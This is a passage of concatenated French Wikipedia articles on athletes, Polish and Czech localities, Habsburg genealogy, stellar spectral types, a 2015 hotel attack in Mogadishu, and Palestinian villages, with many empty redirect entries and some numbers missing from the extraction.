En 1981 à Wimbledon il élimine au premier tour un joueur du top 5 mondial, Ivan Lendl.
Vainqueur du tournoi de double junior de l'Open d'Australie 1976.
Charles Fancutt est le fils de deux anciens joueurs de tennis. Sa mère, Daphne Seeney, a été finaliste en double Wimbledon 1956 et son père Trevor Fancutt était un joueur de Coupe Davis pour l'Afrique du Sud et a remporté le titre en double mixte aux Championnats d'Australie 1960. Il a deux frères jouant au tennis, Michael Fancutt en double notamment et Chris Fancutt sur le circuit Challenger.

</doc>
<doc id="8978501" url="https://fr.wikipedia.org/wiki?curid=8978501" title="Étoile de type intermédiaire">
Étoile de type intermédiaire

Une étoile de type intermédiaire (calque de l'anglais ") est une étoile de type spectral F, G ou K.

</doc>
<doc id="8978502" url="https://fr.wikipedia.org/wiki?curid=8978502" title="Frankie Belinda">
Frankie Belinda



</doc>
<doc id="8978504" url="https://fr.wikipedia.org/wiki?curid=8978504" title="Intermédiaire (type spectral)">
Intermédiaire (type spectral)



</doc>
<doc id="8978505" url="https://fr.wikipedia.org/wiki?curid=8978505" title="Habsbourg-Laufenbourg">
Habsbourg-Laufenbourg

Habsbourg-Laufenbourg est une branche cadette des Habsbourg issue de Rodolphe III († en 1249 ; landgrave de Haute-Alsace ; comte de Laufenbourg : Rodolphe II ; x Gertrude de Regensberg), fils cadet de Rodolphe II l'Ancien (1168-1232) et d'Agnès de Staufen fille de Godefroy. Son frère aîné Albert IV le Sage conserve le titre comtal de Habsbourg et la branche aînée montera sur le trône impérial à la génération suivante.
La branche cadette reçut Laufenbourg, Waldshut, Neu-Habsbourg et Klekgau. À la mort de Rodolphe III, la branche cadette se partage à son tour en deux rameaux :
Ces deux branches s'éteignent au début du .

</doc>
<doc id="8978506" url="https://fr.wikipedia.org/wiki?curid=8978506" title="Straszów (Lubusz)">
Straszów (Lubusz)

Straszów (prononciation : ) est un village polonais de la gmina de Przewóz dans le powiat de Żary de la voïvodie de Lubusz dans l'ouest de la Pologne.
Il se situe à environ au sud-ouest de Żary (siège de le powiat) et au sud-ouest de Zielona Góra (siège de la diétine régionale).
Histoire.
Après la Seconde Guerre mondiale, avec les conséquences de la conférence de Potsdam et la mise en œuvre de la ligne Oder-Neisse, le village est intégré à la république populaire de Pologne. La population d'origine allemande est expulsée et remplacée par des polonais.
De 1975 à 1998, le village est attaché administrativement à la voïvodie de Zielona Góra. Depuis 1999, il fait partie de la voïvodie de Lubusz.

</doc>
<doc id="8978507" url="https://fr.wikipedia.org/wiki?curid=8978507" title="Type spectral intermédiaire">
Type spectral intermédiaire



</doc>
<doc id="8978508" url="https://fr.wikipedia.org/wiki?curid=8978508" title="Étoile de type spectral intermédiaire">
Étoile de type spectral intermédiaire



</doc>
<doc id="8978509" url="https://fr.wikipedia.org/wiki?curid=8978509" title="Straszów (Łódź)">
Straszów (Łódź)

Straszów (prononciation ) est un village de la gmina de Rozprza, du powiat de Piotrków, dans la voïvodie de Łódź, situé dans le centre de la Pologne.
Il se situe à environ à l'est de Rozprza (siège de la gmina), au sud de Piotrków Trybunalski (siège du powiat) et au sud de Łódź (capitale de la voïvodie).
Sa population s'élevait approximativement à habitants en 2011.
Administration.
De 1975 à 1998, le village était attaché administrativement à l'ancienne voïvodie de Piotrków.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Łódź.

</doc>
<doc id="8978511" url="https://fr.wikipedia.org/wiki?curid=8978511" title="Type spectral précoce">
Type spectral précoce



</doc>
<doc id="8978512" url="https://fr.wikipedia.org/wiki?curid=8978512" title="Roberto Micconi">
Roberto Micconi

Roberto Micconi (Venise, 1940) est un organiste, compositeur, chef de chœur et chef d'orchestre italien. Il est organiste titulaire de la Basilique Saint-Marc à Venise.
Biographie.
Élève de l'organiste de Saint-Marc, Carmelo Pavan, il est diplômé du Conservatoire Benedetto Marcello à Venise pour l'orgue, la composition, le clavecin, la direction de chorale et celle d'orchestre. Il s'est perfectionné auprès de Luigi Ferdinando Tagliavini pour l'orgue, Franco Ferrara et Carlo Zecchi pour la direction et Wolfango Dalla Vecchia pour la composition.
En 1973, il a mis en musique trois poésies du célèbre poète vénitien . En 1975 il est devenu organiste à Saint-Marc. Entre 1981 et 2000, il a été également directeur de la Cappella Marciana. À partir de 1990, il dirige l'Orchestre de chambre des jeunes de Venise.
En 2000, il reçoit du Pape Jean-Paul II l'Ordre de Saint-Sylvestre. Il a été remplacé à son poste de directeur de la Cappella Marciana par le Maestro Marco Gemmani.
En 2005, il a été appelé à inaugurer le nouvel orgue de la cathédrale catholique de Moscou.
Il enseigne l'orgue et la composition au Conservatoire de Castelfranco, puis à celui de Venise, dont il a été sous-directeur pendant trois ans et, pendant une courte période, directeur par intérim.
Activité.
Concertiste international, il a effectué de nombreux enregistrements pour la radio et la télévision. Il est souvent invité en tant que musicologue et organologue, à donner des conférences sur la musique vénitienne, en particulier aux États-Unis. Il est membre de plusieurs jurys de concours d'orgue internationaux.
Il a enregistré plusieurs CD, joués sur des orgues historiques vénitiens, et ainsi que plusieurs de ses compositions pour orgue, chœur et orchestre.

</doc>
<doc id="8978513" url="https://fr.wikipedia.org/wiki?curid=8978513" title="Carl Hummel">
Carl Hummel

Carl Maria Nicolaus Hummel, né le à Weimar où il est mort le , est un peintre paysagiste et aquafortiste allemand.
Biographie.
Carl Hummel était un des fils du compositeur Johann Nepomuk Hummel et de son épouse la soprano Elisabeth Röckel. Il a étudié jusqu'en 1841 avec Friedrich Preller à l'École princière libre de dessin de Weimar. Il a aussi fait des voyages d'étude avec lui en Angleterre, en Norvège, à Rügen et plus tard dans le Tyrol. De 1842 à 1846, il est resté en Italie, notamment en Sicile, avant de se réinstaller à Weimar, où il a été nommé professeur à l'École grand-ducale des beaux-arts.
Ses paysages à l'huile ou à l'aquarelle, représentant le plus souvent les Alpes italiennes et tyroliennes, sont caractérisées par le sentiment de la nature et une conception poétique et romantique. Ils sont conservés dans les musées de Leipzig et de Stuttgart, ainsi qu'à Berlin, à Meiningen, au Musée de la vie romantique à Paris, etc. Le château de Weimar abrite "" ("Le Jardin d'Armide").

</doc>
<doc id="8978514" url="https://fr.wikipedia.org/wiki?curid=8978514" title="Nový Bydžov">
Nový Bydžov

Nový Bydžov (prononcé en tchèque : [ˈnoviː ˈbɪdʒof] ; en ) est une ville du district et de la région de Hradec Králové, en Tchéquie. Sa population s'élevait à habitants en 2024.
Géographie.
Nový Bydžov est arrosée par la rivière Cidlina, un affluent de l'Elbe, et se trouve à au nord de Chlumec nad Cidlinou, à à l'ouest de Hradec Králové et à à l'est-nord-est de Prague.
La commune est limitée par Hlušice, Starý Bydžov, Sloupno et Králíky au nord, par Prasek, Humburky et Měník à l'est, par Zachrašťany, Nepolisy et Lužec nad Cidlinou au sud, et par Sloveč à l'ouest.
Histoire.
La ville était la propriété de la famille Vartemberg dès l'année 1325 avant de passer aux mains de la famille Pernštejn en 1516 puis d’être à partir de 1548 propriété des Wallenstein. En 1569, Nový Bydžov fut, contre paiement, exonérée de la servitude et devint ville du domaine royal. Au cours des années 1751-1784, elle fut le siège royal de la région nouvellement créée de Nový Bydžov, laquelle comprenait les monts des Géants de Vrchlabí à Sadská en passant par Jilemnice, Nová Paka, Jičín, Hořice, Nový Bydžov, Chlumec nad Cidlinou et Poděbrady. En 1784, la capitale de la région fut transférée à Jičín en raison de sa position, mais le nom de la région demeura le même jusqu'en 1850.
Nový Bydžov fut alors, de 1850 à 1960, le chef-lieu d'un district. Après l’abolition du district, elle n'a pas cessé d'être le centre naturel de la région.
Transports.
Par la route, Nový Bydžov se trouve à de Chlumec nad Cidlinou, à de Hradec Králové et à de Prague. 

</doc>
<doc id="8978515" url="https://fr.wikipedia.org/wiki?curid=8978515" title="Étoile de type spectral précoce">
Étoile de type spectral précoce



</doc>
<doc id="8978516" url="https://fr.wikipedia.org/wiki?curid=8978516" title="Type spectral tardif">
Type spectral tardif



</doc>
<doc id="8978518" url="https://fr.wikipedia.org/wiki?curid=8978518" title="František Blažej">
František Blažej

František Blažej, né le et mort le , est un entraîneur de football tchécoslovaque.
Biographie.
En 1939, František Blažej dirige la sélection bohémo-morave et reste invaincu avec une victoire et deux matchs nuls en trois matchs. Il réalise notamment un match nul contre l'Allemagne nazie.
S'il s'agit de sa seule expérience de sélectionneur, Blažej deviendra tout de même plus tard président de la fédération tchécoslovaque de football vers le milieu des années 1950.

</doc>
<doc id="8978519" url="https://fr.wikipedia.org/wiki?curid=8978519" title="Étoile de type spectral tardif">
Étoile de type spectral tardif



</doc>
<doc id="8978523" url="https://fr.wikipedia.org/wiki?curid=8978523" title="Mélanie McQuaid">
Mélanie McQuaid

Mélanie McQuaid née le à Victoria au Canada est une cycliste et triathlète professionnelle et double championne du monde de cross triathlon en 2011 et 2017 (ITU), triple vainqueur du championnat du monde de Xterra Triathlon en 2003, 2005 et 2006.
Biographie.
Jeunesse.
Mélanie McQuaid fait des études à l’université de Victoria avant de se lancer dans une carrière sportive. Elle commence le sport par la pratique de l’athlétisme puis elle pratique le cyclisme jusqu'à l'âge de 27 ans sur route et hors route. Elle parvient à se qualifier pour les championnats du monde sur route en 2000, elle finit à la de la course en ligne. La même année, elle s'essaye au cross triathlon en prenant part au circuit Xterra, où elle prend une très belle deuxième place au championnat du monde, elle évolue dès lors définitivement vers le triathlon.
Carrière en triathlon.
En 2006 Mélanie McQuaid devient la première triple championne du monde de Xterra Triathlon, elle remporte également en , l'édition inaugurale du championnat du monde de cross triathlon organisée par la fédération internationale de triathlon (ITU).
Après plusieurs titres et années de compétitions dans le cross triathlon, elle s'engage dans le triathlon longue distance et rencontre rapidement ses premiers succès. Elle emporte en 2014 plusieurs Ironman 70.3 et participe à la finale de ce championnat du monde à Mont Tremblant dans son pays natal.
À l'âge de cinquante ans en 2023, elle finit sur la troisième marche du podium de l'Ironman Coeur d'Alene dans l'Idaho et deuxième de l'Ironman Maryland dans l'État de New York.
Autres activités professionnelles.
En dehors de ses activités sportives personnelles, Mélanie McQuaid a co-organisé une émission de radio, géré une équipe cycliste professionnelle et a plusieurs expériences de "speaker" sportif sur de nombreux médias. En 2009, elle est nommée par la revue spécialisée "Triathlète magazine" , triathlète "offroad" de l’année, elle continue ces activités auxquelles s'ajoute une activité d'entraineur de triathlon.
Palmarès triathlon.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit international de triathlon depuis 2000.
Palmarès cyclisme.
Sur route, elle finit deuxième de la cinquième étape de Redlands Bicycle Classic en 1999. L'année suivante, elle participe aux championnats du monde sur route où elle prend la de la course en ligne. En VTT, elle finit huit fois dans le du championnat du Canada de cross-country dont quatrième en 1997 et 1999.
Voir aussi.
Liens externes.
Site officiel

</doc>
<doc id="8978524" url="https://fr.wikipedia.org/wiki?curid=8978524" title="Ella L'éléphante">
Ella L'éléphante



</doc>
<doc id="8978527" url="https://fr.wikipedia.org/wiki?curid=8978527" title="Championnats d'Europe des régions de karaté 2005">
Championnats d'Europe des régions de karaté 2005



</doc>
<doc id="8978529" url="https://fr.wikipedia.org/wiki?curid=8978529" title="Melanie McQuaid">
Melanie McQuaid



</doc>
<doc id="8978533" url="https://fr.wikipedia.org/wiki?curid=8978533" title="Eovi">
Eovi



</doc>
<doc id="8978535" url="https://fr.wikipedia.org/wiki?curid=8978535" title="Zvonko Petričević">
Zvonko Petričević

Zvonimir « Zvonko » Petričević, né le , à Prizren, en Yougoslavie, est un ancien joueur yougoslave de basket-ball. Il évolue durant sa carrière au poste de pivot.

</doc>
<doc id="8978537" url="https://fr.wikipedia.org/wiki?curid=8978537" title="Cross Triathlon">
Cross Triathlon



</doc>
<doc id="8978540" url="https://fr.wikipedia.org/wiki?curid=8978540" title="Nazim Bakırcı">
Nazim Bakırcı

Nazim Bakırcı (né le à Konya) est un coureur cycliste turc.

</doc>
<doc id="8978541" url="https://fr.wikipedia.org/wiki?curid=8978541" title="Championnats d'Europe des régions de karaté 2006">
Championnats d'Europe des régions de karaté 2006



</doc>
<doc id="8978542" url="https://fr.wikipedia.org/wiki?curid=8978542" title="Lac de Cellano">
Lac de Cellano



</doc>
<doc id="8978548" url="https://fr.wikipedia.org/wiki?curid=8978548" title="Sofía Bekatórou">
Sofía Bekatórou

Sofía Bekatórou (), née le à Athènes (Grèce), est une skipper grecque.
Biographie.
Sofía Bekatórou se classe quatorzième en 470 aux Jeux olympiques d'été de 2000. En 2004, elle remporte le titre olympique en 470. Elle est médaillée de bronze en 2008 en Yngling.
Accusations d'agressions et d'abus sexuels.
Le , Bekatórou déclare lors d'une visioconférence avec le Ministère des Sports en Grèce être victime d'agressions sexuelles par un haut membre de la , les faits remontant à 2000, juste après des essais de préparation, en vue des Jeux olympiques de 2000, à Sydney (Australie). Âgée de 21 ans, elle témoigne en expliquant : Elle conclut : , tout en précisant qu'une telle révélation publique aurait .
Dans la foulée, à la suite de l'annonce de Bekatórou, la Fédération grecque de voile a publié un communiqué dans lequel elle se déclare "choquée" par les révélations de la sportive et a exigé une "démission immédiate" de ce responsable. Par ailleurs, Bekatórou a été félicitée par les autorités helléniques pour avoir brisé le silence et ainsi lever le tabou sur ce sujet d'actualité.

</doc>
<doc id="8978549" url="https://fr.wikipedia.org/wiki?curid=8978549" title="Seydi Sow">
Seydi Sow

Seydi Sow est un écrivain sénégalais, né en à Koungheul.
Biographie.
Seydi Sow a passé une grande partie de sa jeunesse à Kolda. Après le B.E.P.C, il réussit le concours d'entrée à l'école des Agents de Sanitaires de Saint-Louis. Il sort major de cette école et est affecté à Gainth-Pathé comme chef de poste-médical. Il y prépare le concours d'entrée à l'école des infirmiers d’État. Au terme de sa formation, il est encore affecté à Baïla, toujours comme chef de poste-médical, puis à Djibidione. De là-bas, il prépare l'examen d'entrée au C.E.S.S.I.. Ainsi il intègre cet établissement qui forme les cadres infirmiers du Sénégal. Il est major de sa promotion et est affecté comme superviseur des Soins de Santé Primaires dans plusieurs régions et départements. Il devient en 1995, chef de service des soins infirmiers de l'Hôpital Général de Grand Yoff. Et en 1997, il est membre du Conseil de la République pour les Affaires Sociales. En 2002, sous l'avènement de Abdoulaye Wade à la magistrature suprême, il est nommé Conseiller du Ministre de la Santé pour les Affaires médicales.
Seydi Sow a publié en 1996 son premier roman "Misère d'une boniche" aux Éditions L'Harmattan, de Paris. Puis, "La Reine des Sorciers" qui remportera en 1998 le Grand Prix du Chef de l'Etat pour les Lettres. Ensuite vont suivre : "Jusqu'au bout de l'espoir", roman ; "La lumière est en nous", nouvelle, qui sera transformée en pièce de théâtre par la troupe des « 7 Kouss » et jouée sur les planches de Daniel Sorano ; "Au fond du puits", nouvelle, traduite en anglais par l'université de Hararé ; "Jusqu'au bout de l'espoir", roman, préfacé par le scientifique Souleymane Mboup ; "Debout mon enfant", roman, qui obtiendra le du roman des lycéens du Sénégal ; "Les élans brisés", roman ; "Le du couple", pièce de théâtre qui sera créée par la troupe « Arcots » de Dakar et jouée au Grand Théâtre ; "Comme un souffle de vent", poésie ; "Le défi de la Reine des sorciers", roman.
Seydi Sow est l'auteur de plusieurs communications. Il est l'actuel secrétaire exécutif de l'Association des écrivains du Sénégal. Depuis 2002, il a créé sa propre maison d'édition qui porte le nom des Éditions Salamata (EDISAL).
Son roman "Les élans brisés" a fait l'objet d'une maitrise par l'Université Cheikh-Anta-Diop et la publication d'une thèse autour de son roman "La Reine des sorciers" est en cours.
Seydi Sow est lauréat de l'émission du couple Lemoine "La voix des poètes". Il a été présélectionné par l'Association des écrivains pour sa pièce inédite "Ainsi meurent les enfants de Soweto" et ses cinq romans font partie des dix meilleurs manuscrits du Bureau Sénégalais du Droit d'Auteur (BSDA).
Il est Chevalier des Arts du Sénégal.

</doc>
<doc id="8978554" url="https://fr.wikipedia.org/wiki?curid=8978554" title="Vital Eiselt">
Vital Eiselt

Vital Eiselt, né le , à Ljubljana, en Yougoslavie, est un ancien joueur yougoslave de basket-ball.

</doc>
<doc id="8978556" url="https://fr.wikipedia.org/wiki?curid=8978556" title="Jean-Etienne Amaury">
Jean-Etienne Amaury



</doc>
<doc id="8978558" url="https://fr.wikipedia.org/wiki?curid=8978558" title="Championnats d'Europe des régions de karaté 2007">
Championnats d'Europe des régions de karaté 2007



</doc>
<doc id="8978570" url="https://fr.wikipedia.org/wiki?curid=8978570" title="Jean-Baptiste Léonetti">
Jean-Baptiste Léonetti



</doc>
<doc id="8978571" url="https://fr.wikipedia.org/wiki?curid=8978571" title="Shirō Yoshii">
Shirō Yoshii

, né en 1919 et décédé en 1992, est un ancien entraîneur japonais de basket-ball.

</doc>
<doc id="8978574" url="https://fr.wikipedia.org/wiki?curid=8978574" title="Nick Dempsey">
Nick Dempsey

Nick Dempsey, né le à Norwich (Royaume-Uni), est un véliplanchiste britannique.
Biographie.
Après une seizième place aux Jeux olympiques d'été de 2000, Nick Dempsey remporte la médaille de bronze aux Jeux olympiques d'été de 2004 à Athènes. Il termine huitième des Jeux olympiques de 2008 avant de remporter la médaille d'argent olympique en 2012.
La navigatrice britannique Sarah Ayton est son ex-femme.

</doc>
<doc id="8978577" url="https://fr.wikipedia.org/wiki?curid=8978577" title="Podlesie (Radom)">
Podlesie (Radom)

Podlesie (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978580" url="https://fr.wikipedia.org/wiki?curid=8978580" title="Rogowa">
Rogowa

Rogowa (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978581" url="https://fr.wikipedia.org/wiki?curid=8978581" title="Attentat de l'hôtel Makka al-Mukarama">
Attentat de l'hôtel Makka al-Mukarama

L'attentat de l'hôtel Makka al-Mukarama s'est déroulé le à à Mogadiscio (Somalie), perpétré par des militants d'Al-Shabbaab. Le siège a pris fin quelques heures plus tard, le 28 mars, à la suite de l'intervention des forces spéciales de l'armée somalienne, qui ont abattu les cinq assaillants. Selon le ministère de l'information, environ vingt personnes ont perdu la vie dans cette attaque : les auteurs, des membres des forces spéciales, des agents de sécurité de l'hôtel et des civils. Le bilan humain est également de 28 blessés. Les forces spéciales (d'élite) ont réussi à secourir plus de cinquante résidents dans l'hôtel.
Déroulement.
Le 27 mars 2015, un conducteur pénètre dans l'hôtel à bord d'un véhicule de marque Toyota Noah chargé d’explosifs, quatre autres personnes armées arrivent à bord d'un autre véhicule. Une explosion brise les miroirs à l'intérieur de l'hôtel où résident plusieurs membres du gouvernement ainsi que des étrangers. Les occupants s'enferment dans leur chambre. Par la suite, des agents de l'unité d'élite Gaashaan assiègent les militants d'Al-Shabbab durant plus de quatre heures.
Le gouvernement suggère que les militants d'Al-Shabbab voulaient contrôler les lieux pour plusieurs jours et tuer de nombreux civils, comme cela a été le cas en 2013 lors de l'attaque du centre commercial Westgate.
Bilan humain.
Selon les représentants du gouvernement somalien, les cinq assaillants ont été tués. Le ministre de l'information Mohamed Hayir Maareeye a indiqué que quatre soldats du gouvernement, quatre agents de sécurité et cinq civils ont perdu la vie, ainsi qu'une conseillère du ministère des finances et un fonctionnaire de la Banque mondiale. Le diplomate Yusuf Mohamed Ismail fait également partie des victimes.

</doc>
<doc id="8978582" url="https://fr.wikipedia.org/wiki?curid=8978582" title="Championnats d'Europe des régions de karaté 2008">
Championnats d'Europe des régions de karaté 2008



</doc>
<doc id="8978583" url="https://fr.wikipedia.org/wiki?curid=8978583" title="Sławno (Mazovie)">
Sławno (Mazovie)

Sławno (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978588" url="https://fr.wikipedia.org/wiki?curid=8978588" title="Ślepowron (Mazovie)">
Ślepowron (Mazovie)

Ślepowron (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978589" url="https://fr.wikipedia.org/wiki?curid=8978589" title="Joseph Dempsey">
Joseph Dempsey

Joseph Francis Dempsey, né le à Philadelphie et mort le dans la même ville, est un rameur d'aviron américain. Il est membre du Vesper Boat Club, basé à Philadelphie, dans l'état de Pennsylvanie.
Il a remporté la médaille d'or en huit aux Jeux olympiques d'été de 1904 à Saint-Louis.

</doc>
<doc id="8978590" url="https://fr.wikipedia.org/wiki?curid=8978590" title="Feu havane">
Feu havane

Le feu havane est une race de lapin. 
Son nom vient de la couleur de son pelage qui se rapproche de la celle du feu.

</doc>
<doc id="8978592" url="https://fr.wikipedia.org/wiki?curid=8978592" title="Luis Duarte">
Luis Duarte

Luis Duarte, né le , est un ancien joueur péruvien de basket-ball. Il est le frère d'Enrique, Raúl et Ricardo Duarte.

</doc>
<doc id="8978593" url="https://fr.wikipedia.org/wiki?curid=8978593" title="Strzałków (Mazovie)">
Strzałków (Mazovie)

Strzałków (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978597" url="https://fr.wikipedia.org/wiki?curid=8978597" title="Strzałków">
Strzałków

En Pologne, Strzałków peut désigner :

</doc>
<doc id="8978598" url="https://fr.wikipedia.org/wiki?curid=8978598" title="Alaouite (territoire)">
Alaouite (territoire)



</doc>
<doc id="8978599" url="https://fr.wikipedia.org/wiki?curid=8978599" title="Wacławów (Radom)">
Wacławów (Radom)

Wacławów (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978600" url="https://fr.wikipedia.org/wiki?curid=8978600" title="Komikku">
Komikku



</doc>
<doc id="8978601" url="https://fr.wikipedia.org/wiki?curid=8978601" title="Saint Célidoine">
Saint Célidoine

Saint Célidoine ou Chélidoine (mort en 451), est un évêque de Besançon (445-446). 
Biographie.
Déposé par Saint Hilaire, évêque d'Arles, celui-ci jugeant sa fonction incompatible avec le fait d'avoir épousé une veuve, il a recours au pape Saint Léon qui le rétablit. 
Il aurait été massacré lors du siège de Besançon par Attila en 451. 

</doc>
<doc id="8978602" url="https://fr.wikipedia.org/wiki?curid=8978602" title="Beit Imrin">
Beit Imrin

 Beit Imrin () est un village palestinien dans le gouvernorat de Naplouse.
Géographie.
Emplacement géographique.
Biet Imrin (en arabe : بيت امرين) est situé au nord-ouest de la ville de Naplouse à environ . Il est entouré par plusieurs villages tels que, Burqa, Yaseid, Sabastiya, Asira, Nisf Jubail. Il s'élève pieds au niveau de la mer, sur la montagne Bai Yazeed. Sa superficie totale est à peu près 12 100 hectares.
Climat.
Le climat du Beit Imrin est méditerranéen. L'été dure d'avril à octobre, il est chaud et sec. L'hiver est froid et pluvieux. La meilleure période de visiter le village est entre les deux : à l'automne, et au printemps.
Toponymie.
Ce mot est d’origine syriaque. Il signifie le foyer des princes. Les historiens pensent que le roi cananéen Amr vivait dans le village et qu'il a acheté la colline sud ainsi nommé par ce nom à cause d'un homme honnête qui était habitée à la colline.
Population et société.
Ce tableau présente l’évolution de la population entre 2007 et 2015 selon les recensements menés par le bureau central palestinien des statistiques.
Enseignement.
Beaucoup de ressortissants du village ont réussi leurs études supérieures : médecins, d'Ingénieurs, enseignants, employés, etc. Ils ont obtenu des diplômes des universités nationales et étrangères. En 2013, la journaliste Majdolen Hasoon a gagné le premier prix dans le monde arabe dans la compétition "Journalistes contre la corruption".
Écoles.
Le village compte également trois écoles maternelles privées. Parmi elles il y a une école maternelle caractéristique (l'école maternelle du haj ayed hasoon) qui comprend un jardin de jeux pour les enfants de la maternelle et le bus pour les transporter.
Économie.
Agriculture et élevage.
Depuis longtemps, l'agriculture et l'élevage sont le revenu principal pour les habitants du beit Imrin. Mais maintenant ils préfèrent trouver des autres façons pour gagner leur vie, d'avoir un revenu plus élevé. L'agriculture dans le village comme : les oliviers, les amandiers, et les légumes.
Industrie.
Extraordinaire de trouver des usines dans un petit village, mais . Maintenant les habitants dépendent entièrement au ce travail, il y a 200 ouvriers, et en plus les usines exportent leurs produits à toutes les régions de la Cisjordanie en Palestine. Il existe également une usine d'aluminium, une usine de boissons, le lavage de voitures, et une petite Gas Station.
Divers.
Infrastructures.
Les services d'infrastructure disponibles :

</doc>
<doc id="8978603" url="https://fr.wikipedia.org/wiki?curid=8978603" title="Kufur Aboush">
Kufur Aboush

Reliée administrativement au district de Tulkarem, Kufur Aboush est un village palestinien de Cisjordanie. 
Description.
Ce village est l'un des villages occupés par l'armée Israélienne pendant la guerre de 1967. de ses terres ont été confisquées par l’occupation pour la création des colonies.
Comme partout en Palestine, le village a subi les conséquences de la guerre de 1967, les villageois ayant pris la fuite et laissé leurs maisons à cause des invasions israéliennes. Les villageois étaient en route vers Naplouse, lorsque arrivés à Jit, un village à proximité de Naplouse, .
Le village avait aussi son rôle de résistance pendant la première Intifada lorsqu'un soldat israélien a été enlevé et caché par des résistants palestiniens avant qu’il soit libéré à la suite de l'intervention militaire de l'armée israélienne : les soldats israéliens ont rassemblé tous les habitants du village dans l'école et fouillé toutes les maisons du village.
L'ex-ministre de la défense israélien Levi Eshkol a déclaré à l’époque que Gaza était tombé et il ne restait que Kufur Aboush. Le village est appelé depuis cet événement « la forteresse du nord » pour son rôle clé dans la résistance.
Localisation géographique.
Le village se trouve dans un endroit géographique stratégique qui donne une vue sur la mer Méditerranée. Il est sur la bordure du massif montagneux après la plaine côtière de la mer Méditerranée. Il se trouve à au sud-est de Tulkarem, dans le département de Kafryat, sur une colline de d'altitude. Il est bordé par Kur et Kufur Sour au nord, Kufur Zibad à l'ouest, Baka Alhatab à l'est et Seer-Jayous au sud.
Populations.
D'après le recensement mené par le Bureau central palestinien des statistiques en 2015, Kufur Aboush compte .
Appellation.
Ses habitants sont d'origine africaine. Ils sont originaires de Bani Taboush ; une tribu africaine ayant quitté la ville de Rafesh pour s'installer en Palestine.
Économie.
Le village à une superficie de et réputé pour ses champs d’oliviers et d'amandiers, . .
Monuments historiques.
Le village abrite plusieurs sites touristiques et maisons historiques :
On trouve dans le village une crèche, une école maternelle, deux grandes mosquées, une clinique, un centre culturel, une piscine, un café et deux écoles :
Kufur Aboush, « la forteresse du Nord ».
, c'est pour cela qu’ils ont construit une maison de repos et d'accueil « Madafah » ; un endroit situé au centre du village pour accueillir et nourrir les visiteurs ou même les passants à travers le village.

</doc>
<doc id="8978606" url="https://fr.wikipedia.org/wiki?curid=8978606" title="Kufr Sour">
Kufr Sour

Kufr Sour est un village palestinien situé à de Tulkarem et à de Qalqilya. 
Il se trouve sur une montagne à d'altitude et appartient administrativement à Tulkarm. Sour est un mot araméen qui signifie .
Histoire.
En 1948, l'organisation Armée Sioniste a détruit Kufr Sour et a provoqué l’exode de 858 personnes. En 1998, le nombre de réfugiés à Koufr Sour est de qui s’étaient réfugiées en Jordanie et au Koweït. 
Géographie.
Kufr Sour a une superficie d'environ . sont consacrés aux oliviers.
Cinq villages entourent Kufr Sour : Kour à l'ouest, Kufr Jammal au sud , Kufur Aboush et Kufrzibad au sud-ouest et Al Ras au nord. Cette agglomération s'appelle Alkafryat. Elle est administrée par le conseil d'Alkafryat. Ce conseil décide de la distribution aux villages de l'électricité, de l'eau et des services médicaux. Emad Zubdeh qui vient de Kufr Sour et qui était maire d’Alkafryat en prenait soin. Abed Algahni est le maire de ce conseil.
Population.
D'après le recensement mené par le Bureau palestinien des statistiques en 2015  Kufr Sour compte  d'habitants.
Les familles les plus grandes sont : Modallal, Hamza, Hattab, Zubdeh, Saadeh, Obaide, Shobaki, Harb, Ryahi, Nofal et Taweel.
Économie.
Les habitants de Kufr Sour travaillent dans plusieurs domaines : en premier lieu ils sont fonctionnaires dans les administrations publiques ensuite ce sont des salariés, des ouvriers dans les usines ou dans les colonies. Ils exercent aussi dans les commerces, dans les cultures des oliviers, et l'agriculture qui reste très rare.
Industrie.
À la périphérie du village de nombreuses usines se sont installées : l'usine de Radwan Hamza et ses frères (c’est une usine de sidérurgique de fer), l’entreprise de fabrication de boisson, l’usine de fourrage Aziza et celle des briques Alghanim. Il y a aussi des fermes de vaches et des fermes d'élevage.
Commerce.
Au centre du village se trouvent trois épiceries. Il y en a cinq autres autour du village. Il y a également deux salons de beauté pour femmes et hommes. Il existe aussi un petit restaurant, une boutique de réparation de télévisions et un cybercafé. À l'entrée du village il y a deux boucheries, un magasin de peinture, une station de service, un garage, et un pressoir d'olive.
Enseignement.
